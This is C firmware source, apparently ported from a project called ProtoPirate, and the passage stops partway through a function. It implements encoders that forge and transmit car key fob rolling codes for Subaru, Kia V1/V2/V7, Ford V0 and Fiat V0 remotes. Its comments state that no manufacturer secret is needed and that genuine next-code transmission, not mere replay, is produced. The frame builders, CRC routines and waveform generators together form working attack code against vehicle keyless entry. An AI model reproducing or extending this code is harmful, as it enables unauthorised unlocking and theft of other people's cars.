    uint8_t b[8] = {0, 0, 0, 0, 0, 0, 0, 0};
    b[0] = (uint8_t)(btn & 0x0F);
    b[1] = (uint8_t)((serial >> 16) & 0xFF);
    b[2] = (uint8_t)((serial >> 8) & 0xFF);
    b[3] = (uint8_t)(serial & 0xFF);
    subaru_enc_count(b, (uint16_t)(cnt & 0xFFFF));

    *out_data = pp_bytes_to_u64_be(b);
    *out_bits = 64;
    return true;
}

// Port of subghz_protocol_subaru_get_upload() on passed data/bits.
static size_t subaru_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits; // Subaru frame is always a 64-bit key.
    size_t index = 0;

    const uint32_t te_short = subghz_protocol_subaru_const.te_short;
    const uint32_t te_long = subghz_protocol_subaru_const.te_long;
    const uint32_t gap_duration = subaru_enc_gap_us;
    const uint32_t sync_duration = subaru_enc_sync_us;

    for(int i = 0; i < subaru_enc_preamble_pairs; i++) {
        index = pp_emit(up, index, cap, false, te_long);
        index = pp_emit(up, index, cap, true, te_long);
    }

    index = pp_emit(up, index, cap, false, gap_duration);
    index = pp_emit(up, index, cap, true, sync_duration);

    for(int i = 63; i >= 0; i--) {
        bool bit = (data >> i) & 1;
        if(bit) {
            index = pp_emit(up, index, cap, false, te_long);
            index = pp_emit(up, index, cap, true, te_short);
        } else {
            index = pp_emit(up, index, cap, false, te_short);
            index = pp_emit(up, index, cap, true, te_long);
        }
    }

    index = pp_emit(up, index, cap, false, gap_duration);
    index = pp_emit(up, index, cap, true, sync_duration);

    return index;
}

static size_t
    subaru_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!subaru_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return subaru_enc_upload(data, bits, up, cap);
}

// ============================================================================
// KIA V2  --  ProtoPirate encoder (GPLv3)
// Modulation: AM (OOK)  ->  is_fsk = false
// Rolling code: algorithmic (nibble-XOR CRC, +1). No secret key.
// ============================================================================

static const int    kia_v2_enc_header_pairs     = 252;
static const int    kia_v2_enc_total_bursts     = 2;
static const size_t kia_v2_enc_upload_capacity  = 1218U; // 2 * (504 + 1 + 104)
static const bool   kia_v2_enc_is_fsk           = false;

// Port of kia_v2_calculate_crc() (prefixed copy to avoid decode-side collision).
static uint8_t kia_v2_enc_calculate_crc(uint64_t data) {
    uint64_t data_without_crc = data >> 4;

    uint8_t bytes[6];
    bytes[0] = (uint8_t)(data_without_crc);
    bytes[1] = (uint8_t)(data_without_crc >> 8);
    bytes[2] = (uint8_t)(data_without_crc >> 16);
    bytes[3] = (uint8_t)(data_without_crc >> 24);
    bytes[4] = (uint8_t)(data_without_crc >> 32);
    bytes[5] = (uint8_t)(data_without_crc >> 40);

    uint8_t crc = 0;
    for(int i = 0; i < 6; i++) {
        crc ^= (bytes[i] & 0x0F) ^ (bytes[i] >> 4);
    }

    return (crc + 1) & 0x0F;
}

// Rebuild the 53-bit frame from serial/btn/cnt (cnt already incremented) and
// insert the recomputed CRC nibble.
static bool kia_v2_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    uint64_t new_data = 0;

    new_data |= 1ULL << 52;

    new_data |= ((uint64_t)serial << 20) & 0xFFFFFFFFF00000ULL;

    uint32_t uVar6 = ((uint32_t)(cnt & 0xFF) << 8) | ((uint32_t)(btn & 0x0F) << 16) |
                     ((uint32_t)(cnt >> 4) & 0xF0);

    new_data |= (uint64_t)uVar6;

    uint8_t crc = kia_v2_enc_calculate_crc(new_data);
    new_data = (new_data & ~0x0FULL) | crc;

    *out_data = new_data;
    *out_bits = 53;
    return true;
}

// Port of kia_protocol_encoder_v2_get_upload() on passed data/bits.
// (Re-applies CRC verbatim; idempotent since CRC is computed over data>>4.)
static size_t kia_v2_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    size_t index = 0;

    const uint32_t te_short = (uint32_t)kia_protocol_v2_const.te_short;
    const uint32_t te_long = (uint32_t)kia_protocol_v2_const.te_long;

    uint8_t crc = kia_v2_enc_calculate_crc(data);
    data = (data & ~0x0FULL) | crc;

    for(int burst = 0; burst < kia_v2_enc_total_bursts; burst++) {
        for(int i = 0; i < kia_v2_enc_header_pairs; i++) {
            index = pp_emit(up, index, cap, false, te_long);
            index = pp_emit(up, index, cap, true, te_long);
        }

        index = pp_emit(up, index, cap, false, te_short);

        for(uint16_t i = bits; i > 1; i--) {
            bool bit = bit_read(data, i - 2);
            index = pp_emit(up, index, cap, bit, te_short);
            index = pp_emit(up, index, cap, !bit, te_short);
        }
    }

    return index;
}

static size_t
    kia_v2_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!kia_v2_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return kia_v2_enc_upload(data, bits, up, cap);
}

// ============================================================================
// KIA V7  --  ProtoPirate encoder (GPLv3)
// Modulation: FM (2-FSK)  ->  is_fsk = true
// Rolling code: algorithmic (crc8 poly 0x7F / init 0x4C). No secret key.
// ============================================================================

static const uint8_t  kia_v7_enc_header             = 0x4C; // KIA_V7_HEADER, fixed high byte
static const uint8_t  kia_v7_enc_key_bits           = 64U;
static const size_t   kia_v7_enc_preamble_pairs     = 0x13F; // 319
static const size_t   kia_v7_enc_tail_preamble_pairs = 0x0F; // 15
static const uint32_t kia_v7_enc_tail_gap_us        = 0x7D0; // 2000
static const size_t   kia_v7_enc_upload_capacity    = 930U;  // FRAME_SLOTS(319)+FRAME_SLOTS(15)
static const bool     kia_v7_enc_is_fsk             = true;

// Port of kia_v7_encode_key() (prefixed copy to avoid decode-side collision).
// crc8 uses poly 0x7F, init 0x4C (== kia_v7_crc8 macro).
static uint64_t kia_v7_enc_encode_key(
    uint8_t fixed_high_byte,
    uint32_t serial,
    uint8_t button,
    uint16_t counter,
    uint8_t* crc_out) {
    uint8_t bytes[8];

    serial &= 0x0FFFFFFFU;
    button &= 0x0FU;

    bytes[0] = fixed_high_byte;
    bytes[1] = (counter >> 8U) & 0xFFU;
    bytes[2] = counter & 0xFFU;
    bytes[3] = (serial >> 20U) & 0xFFU;
    bytes[4] = (serial >> 12U) & 0xFFU;
    bytes[5] = (serial >> 4U) & 0xFFU;
    bytes[6] = ((serial & 0x0FU) << 4U) | button;
    bytes[7] = subghz_protocol_blocks_crc8(bytes, 7, 0x7F, 0x4C);

    if(crc_out) {
        *crc_out = bytes[7];
    }

    return pp_bytes_to_u64_be(bytes);
}

// Rebuild the 64-bit key from serial/btn/cnt (cnt already incremented). The
// fixed high byte is the protocol header 0x4C (see limitations).
static bool kia_v7_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    uint8_t crc = 0;
    *out_data = kia_v7_enc_encode_key(
        kia_v7_enc_header, serial, (uint8_t)(btn & 0x0F), (uint16_t)(cnt & 0xFFFF), &crc);
    *out_bits = kia_v7_enc_key_bits;
    return true;
}

// Port of kia_v7_encoder_append_frame() via the pp_emit family.
static size_t kia_v7_enc_append_frame(
    LevelDuration* up,
    size_t index,
    size_t cap,
    uint64_t data,
    uint8_t bit_count,
    size_t preamble_pairs) {
    const uint32_t te_short = (uint32_t)kia_protocol_v7_const.te_short;

    for(size_t i = 0; i < preamble_pairs; i++) {
        index = pp_emit(up, index, cap, true, te_short);
        index = pp_emit(up, index, cap, false, te_short);
    }

    index = pp_emit(up, index, cap, true, te_short);

    for(int32_t bit = (int32_t)bit_count - 1; bit >= 0; bit--) {
        const bool value = ((data >> bit) & 1ULL) != 0ULL;
        index = pp_emit(up, index, cap, value, te_short);
        index = pp_emit(up, index, cap, !value, te_short);
    }

    index = pp_emit(up, index, cap, true, te_short);
    index = pp_emit(up, index, cap, false, kia_v7_enc_tail_gap_us);
    return index;
}

// Port of kia_v7_encoder_get_upload() on passed data/bits (two frames: long
// preamble then short tail preamble).
static size_t kia_v7_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    const uint8_t bit_count = (bits > 0U && bits <= 64U) ? (uint8_t)bits : 64U;
    size_t index = 0;

    index = kia_v7_enc_append_frame(up, index, cap, data, bit_count, kia_v7_enc_preamble_pairs);
    index =
        kia_v7_enc_append_frame(up, index, cap, data, bit_count, kia_v7_enc_tail_preamble_pairs);

    return index;
}

static size_t
    kia_v7_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!kia_v7_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return kia_v7_enc_upload(data, bits, up, cap);
}

/* ============================================================================
 * ProtoPirate encoder (GPLv3) -- summary
 *
 *   SUBARU
 *     entry point : subaru_enc_next(serial, btn, cnt, up, cap)
 *     is_fsk      : false  (AM / OOK)
 *     max pulses  : 282 slots emitted; recommend cap >= 320
 *                   (subaru_enc_upload_capacity)
 *     limitations : - Byte 0 high nibble is a fixed field not carried by
 *                     serial/btn/cnt; assumed 0. If a captured key had a
 *                     non-zero high nibble it will not be reproduced (would
 *                     need the original key bytes, not a secret key).
 *                   - Frame width fixed at 64 bits; bits arg ignored on upload.
 *                   - No secret/crypto: full next-rolling-code generation works.
 *
 *   KIA V2
 *     entry point : kia_v2_enc_next(serial, btn, cnt, up, cap)
 *     is_fsk      : false  (AM / OOK)
 *     max pulses  : 1218 slots; cap == kia_v2_enc_upload_capacity (1218)
 *                   = 2 bursts * ((252*2) + 1 + ((53-1)*2))
 *     limitations : - 53-bit frame; CRC is the nibble-XOR+1 checksum (not a
 *                     secret). Counter is packed with the source nibble-swap.
 *                   - No secret/crypto: full next-rolling-code generation works.
 *
 *   KIA V7
 *     entry point : kia_v7_enc_next(serial, btn, cnt, up, cap)
 *     is_fsk      : true   (FM / 2-FSK)
 *     max pulses  : 930 slots; cap == kia_v7_enc_upload_capacity (930)
 *                   = FRAME_SLOTS(319) + FRAME_SLOTS(15), 2 frames
 *     limitations : - Fixed high byte assumed to be the protocol header 0x4C
 *                     (matches every valid captured frame).
 *                   - CRC via subghz_protocol_blocks_crc8(poly=0x7F, init=0x4C).
 *                   - No secret/crypto: full next-rolling-code generation works.
 *
 *   All three are pure algorithmic rolling codes: no manufacturer secret key or
 *   cipher is involved, so genuine next-code TX (not mere replay) is produced.
 * ============================================================================ */

/*
 * pp_enc_kiaford.h
 * ProtoPirate encoder (GPLv3)
 *
 * Self-contained ENCODE / next-rolling-code path for the car-key protocols
 * kia_v1 and ford_v0, ported from ProtoPirate (GPLv3) for an ESP32 firmware.
 *
 * This fragment provides ONLY the encode side. It relies on the already
 * provided encoder shim (LevelDuration, level_duration_make, pp_emit,
 * pp_emit_merge, bit_read, subghz_protocol_blocks_parity8, ...) and on the
 * decode-side shim which already defines the <p>_const structs / timing
 * #defines. Every new symbol here is prefixed with <p>_enc_ to avoid
 * collisions with the decode side. No #include / #pragma once by design.
 */

/* ===========================================================================
 * KIA V1  --  ProtoPirate encoder (GPLv3)
 * Modulation: AM (OOK) -> is_fsk = false
 * Rolling code: CRC4-over-(serial,btn,cnt) ; NO secret key required.
 * =========================================================================== */

#define KIA_V1_ENC_TOTAL_BURSTS       3
#define KIA_V1_ENC_HEADER_PULSES      90
#define KIA_V1_ENC_INTER_BURST_GAP_US 25000
#define KIA_V1_ENC_TE_SHORT           800U
#define KIA_V1_ENC_TE_LONG            1600U
#define KIA_V1_ENC_BITS               57U
#define KIA_V1_ENC_UPLOAD_CAPACITY                                                 \
    ((KIA_V1_ENC_TOTAL_BURSTS * ((KIA_V1_ENC_HEADER_PULSES * 2) + 1 +              \
                                 ((KIA_V1_ENC_BITS - 1U) * 2))) +                  \
     (KIA_V1_ENC_TOTAL_BURSTS - 1))

/* CRC4: nibble-fold XOR of the message bytes, then + offset, masked to 4 bits. */
static uint8_t kia_v1_enc_crc4(const uint8_t* bytes, int count, uint8_t offset) {
    uint8_t crc = 0;
    for(int i = 0; i < count; i++) {
        uint8_t b = bytes[i];
        crc ^= ((b & 0x0F) ^ (b >> 4));
    }
    crc = (crc + offset) & 0x0F;
    return crc;
}

/* Reconstruct the 57-bit data word from serial/btn/cnt (caller passes cnt
 * already incremented). Ported from kia_protocol_encoder_v1_get_upload's
 * data rebuild + kia_protocol_encoder_v1_deserialize. */
static bool kia_v1_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    if(!out_data || !out_bits) return false;

    uint16_t cnt16 = (uint16_t)cnt;
    uint8_t cnt_high = (cnt16 >> 8) & 0xF;

    uint8_t char_data[7];
    char_data[0] = (serial >> 24) & 0xFF;
    char_data[1] = (serial >> 16) & 0xFF;
    char_data[2] = (serial >> 8) & 0xFF;
    char_data[3] = serial & 0xFF;
    char_data[4] = btn;
    char_data[5] = cnt16 & 0xFF;
    char_data[6] = cnt_high;

    uint8_t crc = kia_v1_enc_crc4(char_data, 7, 1);

    *out_data = ((uint64_t)serial << 24) | ((uint64_t)btn << 16) |
                (uint64_t)((cnt16 & 0xFF) << 8) | (uint64_t)(((cnt16 >> 8) & 0xF) << 4) |
                (uint64_t)crc;
    *out_bits = (uint16_t)KIA_V1_ENC_BITS;
    return true;
}

/* Port of kia_protocol_encoder_v1_get_upload (encoder path) verbatim,
 * driven by the passed data/bits. Returns the number of LevelDuration
 * entries written. Manchester-style: long/long header pulses, a short
 * start gap, then each data bit emitted as (bit,te_short)+(!bit,te_short). */
static size_t kia_v1_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    size_t index = 0;
    const uint32_t te_short = KIA_V1_ENC_TE_SHORT;
    const uint32_t te_long = KIA_V1_ENC_TE_LONG;

    for(uint8_t burst = 0; burst < KIA_V1_ENC_TOTAL_BURSTS; burst++) {
        if(burst > 0) {
            index = pp_emit(up, index, cap, false, KIA_V1_ENC_INTER_BURST_GAP_US);
        }

        for(int i = 0; i < KIA_V1_ENC_HEADER_PULSES; i++) {
            index = pp_emit(up, index, cap, false, te_long);
            index = pp_emit(up, index, cap, true, te_long);
        }

        index = pp_emit(up, index, cap, false, te_short);

        for(uint16_t i = bits; i > 1; i--) {
            bool bit = bit_read(data, i - 2);
            index = pp_emit(up, index, cap, bit, te_short);
            index = pp_emit(up, index, cap, !bit, te_short);
        }
    }

    return index;
}

static const bool kia_v1_enc_is_fsk = false;

/* build + upload. Returns pulse (entry) count, 0 on failure. */
static size_t kia_v1_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!kia_v1_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return kia_v1_enc_upload(data, bits, up, cap);
}

/* ===========================================================================
 * FORD V0  --  ProtoPirate encoder (GPLv3)
 * Modulation: AM (OOK) -> is_fsk = false
 * Rolling code: checksum(serial,cnt,btn) + GF(2) matrix CRC ; NO secret key.
 * =========================================================================== */

#define FORD_V0_ENC_PREAMBLE_PAIRS 4
#define FORD_V0_ENC_GAP_US         3500
#define FORD_V0_ENC_TOTAL_BURSTS   6
#define FORD_V0_ENC_TE_SHORT       250U
#define FORD_V0_ENC_TE_LONG        500U
#define FORD_V0_ENC_UPLOAD_CAPACITY (((FORD_V0_ENC_TOTAL_BURSTS - 1U) * 169U) + 168U)

/* GF(2) CRC matrix (identical to decode side; duplicated here, enc-prefixed). */
static const uint8_t ford_v0_enc_crc_matrix[64] = {
    0xDA, 0xB5, 0x55, 0x6A, 0xAA, 0xAA, 0xAA, 0xD5, 0xB6, 0x6C, 0xCC, 0xD9, 0x99, 0x99, 0x99, 0xB3,
    0x71, 0xE3, 0xC3, 0xC7, 0x87, 0x87, 0x87, 0x8F, 0x0F, 0xE0, 0x3F, 0xC0, 0x7F, 0x80, 0x7F, 0x80,
    0x00, 0x1F, 0xFF, 0xC0, 0x00, 0x7F, 0xFF, 0x80, 0x00, 0x00, 0x00, 0x3F, 0xFF, 0xFF, 0xFF, 0x80,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7F, 0x23, 0x12, 0x94, 0x84, 0x35, 0xF4, 0x55, 0x84,
};

/* Header byte is NOT recoverable from serial/btn/cnt and is ignored by both
 * the decoder and the CRC/checksum, so it defaults to 0x00. A caller that
 * captured the original frame may set this to the original top byte of key1
 * before calling ford_v0_enc_next() if a receiver validates it. */
static uint8_t ford_v0_enc_header_byte = 0x00;

/* Carries key2 (checksum<<8 | crc) from ford_v0_enc_build() to
 * ford_v0_enc_upload(): the fixed (uint64_t data, uint16_t bits) upload
 * signature cannot carry the extra 16 bits of the 80-bit Ford frame.
 * Single-threaded TX only (ford_v0_enc_next calls build then upload). */
static uint16_t ford_v0_enc_key2_carry = 0;

static uint8_t ford_v0_enc_calculate_checksum(uint32_t serial, uint32_t count, uint8_t button) {
    return (uint8_t)((((count >> 24) & 0xFF) + ((count >> 16) & 0xFF) + ((count >> 8) & 0xFF) +
                      (count & 0xFF) + ((serial >> 24) & 0xFF) + ((serial >> 16) & 0xFF) +
                      ((serial >> 8) & 0xFF) + (serial & 0xFF) + (button << 3)) &
                     0xFF);
}

static uint8_t ford_v0_enc_calculate_crc(uint8_t* buf) {
    uint8_t crc = 0;
    for(int row = 0; row < 8; row++) {
        uint8_t xor_sum = 0;
        for(int col = 0; col < 8; col++) {
            xor_sum ^= (ford_v0_enc_crc_matrix[row * 8 + col] & buf[col + 1]);
        }
        uint8_t parity = subghz_protocol_blocks_parity8(xor_sum);
        if(parity) {
            crc |= (1 << row);
        }
    }
    return crc;
}

static uint8_t ford_v0_enc_calculate_crc_for_tx(uint64_t key1, uint8_t checksum) {
    uint8_t buf[16] = {0};
    for(int i = 0; i < 8; ++i) {
        buf[i] = (uint8_t)(key1 >> (56 - i * 8));
    }
    buf[8] = checksum;
    uint8_t crc = ford_v0_enc_calculate_crc(buf);
    return crc ^ 0x80;
}

/* Port of encode_ford_v0 verbatim (logging/NULL-log removed). */
static void ford_v0_enc_encode(
    uint8_t header_byte,
    uint32_t serial,
    uint8_t button,
    uint32_t count,
    uint8_t checksum,
    uint64_t* key1) {
    if(!key1) return;

    uint8_t buf[8] = {0};

    buf[0] = header_byte;

    buf[1] = (serial >> 24) & 0xFF;
    buf[2] = (serial >> 16) & 0xFF;
    buf[3] = (serial >> 8) & 0xFF;
    buf[4] = serial & 0xFF;

    buf[5] = ((button & 0x0F) << 3) | ((count >> 16) & 0x0F);

    uint8_t count_mid = (count >> 8) & 0xFF;
    uint8_t count_low = count & 0xFF;

    uint8_t post_xor_6 = (count_mid & 0xAA) | (count_low & 0x55);
    uint8_t post_xor_7 = (count_low & 0xAA) | (count_mid & 0x55);

    uint8_t parity = 0;
    uint8_t tmp = checksum;
    while(tmp) {
        parity ^= (tmp & 1);
        tmp >>= 1;
    }
    bool parity_bit = (checksum != 0) ? (parity != 0) : false;

    if(parity_bit) {
        uint8_t xor_byte = post_xor_7;
        buf[1] ^= xor_byte;
        buf[2] ^= xor_byte;
        buf[3] ^= xor_byte;
        buf[4] ^= xor_byte;
        buf[5] ^= xor_byte;
        buf[6] = post_xor_6 ^ xor_byte;
        buf[7] = post_xor_7;
    } else {
        uint8_t xor_byte = post_xor_6;
        buf[1] ^= xor_byte;
        buf[2] ^= xor_byte;
        buf[3] ^= xor_byte;
        buf[4] ^= xor_byte;
        buf[5] ^= xor_byte;
        buf[6] = post_xor_6;
        buf[7] = post_xor_7 ^ xor_byte;
    }

    *key1 = 0;
    for(int i = 0; i < 8; i++) {
        *key1 = (*key1 << 8) | buf[i];
    }
}

/* Reconstruct key1 (64 bits) from serial/btn/cnt (caller passes cnt already
 * incremented). key2 (checksum/crc) is stashed in ford_v0_enc_key2_carry.
 * Ported from subghz_protocol_encoder_ford_v0_deserialize. */
static bool ford_v0_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    if(!out_data || !out_bits) return false;

    uint8_t checksum = ford_v0_enc_calculate_checksum(serial, cnt, btn);

    uint64_t key1 = 0;
    ford_v0_enc_encode(ford_v0_enc_header_byte, serial, btn, cnt, checksum, &key1);

    uint8_t calculated_crc = ford_v0_enc_calculate_crc_for_tx(key1, checksum);
    ford_v0_enc_key2_carry = ((uint16_t)checksum << 8) | calculated_crc;

    *out_data = key1;
    *out_bits = 64;
    return true;
}

/* Port of subghz_protocol_encoder_ford_v0_get_upload verbatim. Uses key1
 * from `data` and key2 from ford_v0_enc_key2_carry. `bits` is unused (the
 * frame structure is fixed at 64+16). Biphase/differential Manchester with
 * inverted keys. Returns entry count. */
static size_t ford_v0_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;
    size_t index = 0;

    uint64_t tx_key1 = ~data;
    uint16_t tx_key2 = ~ford_v0_enc_key2_carry;

    const uint32_t te_short = FORD_V0_ENC_TE_SHORT;
    const uint32_t te_long = FORD_V0_ENC_TE_LONG;

#define FORD_V0_ENC_ADD(lvl, dur) index = pp_emit_merge(up, index, cap, (lvl), (dur))

    for(uint8_t burst = 0; burst < FORD_V0_ENC_TOTAL_BURSTS; burst++) {
        FORD_V0_ENC_ADD(true, te_short);
        FORD_V0_ENC_ADD(false, te_long);

        for(int i = 0; i < FORD_V0_ENC_PREAMBLE_PAIRS; i++) {
            FORD_V0_ENC_ADD(true, te_long);
            FORD_V0_ENC_ADD(false, te_long);
        }

        FORD_V0_ENC_ADD(true, te_short);
        FORD_V0_ENC_ADD(false, FORD_V0_ENC_GAP_US);

        bool first_bit = (tx_key1 >> 62) & 1;
        if(first_bit) {
            FORD_V0_ENC_ADD(true, te_long);
        } else {
            FORD_V0_ENC_ADD(true, te_short);
            FORD_V0_ENC_ADD(false, te_long);
        }

        bool prev_bit = first_bit;

        for(int bit = 61; bit >= 0; bit--) {
            bool curr_bit = (tx_key1 >> bit) & 1;

            if(!prev_bit && !curr_bit) {
                FORD_V0_ENC_ADD(true, te_short);
                FORD_V0_ENC_ADD(false, te_short);
            } else if(!prev_bit && curr_bit) {
                FORD_V0_ENC_ADD(true, te_long);
            } else if(prev_bit && !curr_bit) {
                FORD_V0_ENC_ADD(false, te_long);
            } else {
                FORD_V0_ENC_ADD(false, te_short);
                FORD_V0_ENC_ADD(true, te_short);
            }

            prev_bit = curr_bit;
        }

        for(int bit = 15; bit >= 0; bit--) {
            bool curr_bit = (tx_key2 >> bit) & 1;

            if(!prev_bit && !curr_bit) {
                FORD_V0_ENC_ADD(true, te_short);
                FORD_V0_ENC_ADD(false, te_short);
            } else if(!prev_bit && curr_bit) {
                FORD_V0_ENC_ADD(true, te_long);
            } else if(prev_bit && !curr_bit) {
                FORD_V0_ENC_ADD(false, te_long);
            } else {
                FORD_V0_ENC_ADD(false, te_short);
                FORD_V0_ENC_ADD(true, te_short);
            }

            prev_bit = curr_bit;
        }

        if(burst < FORD_V0_ENC_TOTAL_BURSTS - 1) {
            FORD_V0_ENC_ADD(false, te_long * 100);
        }
    }

#undef FORD_V0_ENC_ADD

    return index;
}

static const bool ford_v0_enc_is_fsk = false;

/* build + upload. Returns pulse (entry) count, 0 on failure. */
static size_t ford_v0_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!ford_v0_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return ford_v0_enc_upload(data, bits, up, cap);
}

/* ===========================================================================
 * ProtoPirate encoder (GPLv3) -- summary
 *
 * kia_v1:
 *   entry       : kia_v1_enc_next(serial, btn, cnt, up, cap)
 *   is_fsk      : false (AM / OOK)
 *   max cap     : KIA_V1_ENC_UPLOAD_CAPACITY = 881 LevelDuration entries
 *   rolling     : genuine next-code. CRC4(serial,btn,cnt) recomputed; no
 *                 secret key / crypto required. Caller increments cnt.
 *   limitations : cnt is effectively 12 bits (0xFFF); btn 8 bits. Fully
 *                 self-contained, no missing symbols.
 *
 * ford_v0:
 *   entry       : ford_v0_enc_next(serial, btn, cnt, up, cap)
 *   is_fsk      : false (AM / OOK)
 *   max cap     : FORD_V0_ENC_UPLOAD_CAPACITY = 1013 LevelDuration entries
 *   rolling     : genuine next-code. checksum(serial,cnt,btn) + GF(2) matrix
 *                 CRC recomputed; no secret key / crypto required. Caller
 *                 increments cnt.
 *   limitations : (1) The frame's header byte (top byte of key1) is not
 *                 recoverable from serial/btn/cnt and defaults to 0x00. Both
 *                 the decoder and the CRC/checksum ignore it, so the frame is
 *                 valid; if a specific receiver validates it, set
 *                 ford_v0_enc_header_byte to the captured original first.
 *                 (2) The 80-bit frame (key1 64b + key2 16b) does not fit the
 *                 fixed (uint64_t data, uint16_t bits) upload signature; key2
 *                 is passed via the module-static ford_v0_enc_key2_carry set
 *                 by ford_v0_enc_build(). ford_v0_enc_next() sequences build
 *                 then upload, so this is safe for single-threaded TX only.
 *                 No missing symbols / no crypto secret needed.
 * =========================================================================== */

/*
 * pp_enc_frfiat.h — self-contained ENCODER fragments for ProtoPirate car-key
 * protocols (French brands: Fiat V0, Renault V1 / HITAG2).
 *
 * Ported from ProtoPirate (GPLv3). Encode / transmit / next-rolling-code path.
 * Intended to be #included inside an ESP32 firmware translation unit that
 * ALREADY provides the encoder shim (level_duration_make, pp_emit family,
 * pp_reverse_bits8, pp_u64_to_bytes_be, pp_bytes_to_u64_be, bit_read,
 * DURATION_DIFF, subghz_protocol_blocks_crc8/crc16/get_parity/parity8) AND the
 * DECODE-side fragment (which defines each protocol's <p>_const and decode-side
 * timing #defines). This file therefore prefixes EVERY new static / macro with
 * <p>_enc_ / <P>_ENC_ so nothing collides with the decode fragment.
 *
 * No #include, no #pragma once — paste-in fragment.
 */

/* ============================================================================
 * Fiat V0  —  ProtoPirate encoder (GPLv3)
 * ----------------------------------------------------------------------------
 * AM/OOK, differential-transition Manchester, 3 identical bursts.
 * Frame = 64-bit key (hop:32 | fix:32) + 6-bit endbyte (endbyte7 >> 1).
 * NOTE: Fiat V0 has NO rolling-code cipher in this source — the encoder just
 * re-emits the supplied 32-bit "hop" verbatim. It cannot synthesise the next
 * VALID encrypted hop from a plain counter; passing an incremented counter as
 * `cnt` only re-serialises that value (useful for REPLAY of a captured frame or
 * for user-supplied hop values). See limitation note at the end of file.
 * ==========================================================================*/

#define FIAT_V0_ENC_TE_SHORT       200U
#define FIAT_V0_ENC_TE_LONG        400U
#define FIAT_V0_ENC_PREAMBLE_PAIRS 150
#define FIAT_V0_ENC_GAP_US         800U
#define FIAT_V0_ENC_TOTAL_BURSTS   3
#define FIAT_V0_ENC_INTER_BURST_GAP 25000U
#define FIAT_V0_ENC_UPLOAD_CAPACITY 1328U

/* endbyte carried between build() and upload() because the mandated upload
 * signature only passes (data,bits) and the 6-bit endbyte is not part of the
 * 64-bit key. enc_next() guarantees build() runs immediately before upload(). */
static uint8_t fiat_v0_enc_endbyte7 = 0;

static const bool fiat_v0_enc_is_fsk = false; /* SubGhzProtocolFlag_AM only */

/* 1) reconstruct generic.data from serial/btn/cnt (no CRC in this protocol). */
static bool fiat_v0_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    if((out_data == NULL) || (out_bits == NULL)) return false;

    const uint32_t fix = serial;   /* fixed part  = decoder serial */
    const uint32_t hop = cnt;      /* rolling part = decoder cnt (caller pre-incremented) */
    fiat_v0_enc_endbyte7 = (uint8_t)(btn & 0x7FU);

    *out_data = ((uint64_t)hop << 32) | fix;
    *out_bits = 71U;
    return true;
}

/* 2) waveform builder — ported verbatim from
 * subghz_protocol_encoder_fiat_v0_get_upload, operating on `data`. */
static size_t
    fiat_v0_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;
    if(up == NULL) return 0;

    size_t index = 0;
    const uint32_t te_short = FIAT_V0_ENC_TE_SHORT;
    const uint32_t te_long = FIAT_V0_ENC_TE_LONG;

    const uint8_t endbyte_to_send = (uint8_t)(fiat_v0_enc_endbyte7 >> 1);

    for(uint8_t burst = 0; burst < FIAT_V0_ENC_TOTAL_BURSTS; burst++) {
        if(burst > 0) {
            index = pp_emit(up, index, cap, false, FIAT_V0_ENC_INTER_BURST_GAP);
        }

        for(int i = 0; i < FIAT_V0_ENC_PREAMBLE_PAIRS; i++) {
            index = pp_emit(up, index, cap, true, te_short);
            index = pp_emit(up, index, cap, false, te_short);
        }
        if(index > 0) up[index - 1] = level_duration_make(false, FIAT_V0_ENC_GAP_US);

        bool first_bit = (data >> 63) & 1;
        if(first_bit) {
            index = pp_emit(up, index, cap, true, te_long);
        } else {
            index = pp_emit(up, index, cap, true, te_short);
            index = pp_emit(up, index, cap, false, te_long);
        }
        bool prev_bit = first_bit;

        for(int bit = 62; bit >= 0; bit--) {
            bool curr_bit = (data >> bit) & 1;
            if(!prev_bit && !curr_bit) {
                index = pp_emit(up, index, cap, true, te_short);
                index = pp_emit(up, index, cap, false, te_short);
            } else if(!prev_bit && curr_bit) {
                index = pp_emit(up, index, cap, true, te_long);
            } else if(prev_bit && !curr_bit) {
                index = pp_emit(up, index, cap, false, te_long);
            } else {
                index = pp_emit(up, index, cap, false, te_short);
                index = pp_emit(up, index, cap, true, te_short);
            }
            prev_bit = curr_bit;
        }

        for(int bit = 5; bit >= 0; bit--) {
            bool curr_bit = (endbyte_to_send >> bit) & 1;
            if(!prev_bit && !curr_bit) {
                index = pp_emit(up, index, cap, true, te_short);
                index = pp_emit(up, index, cap, false, te_short);
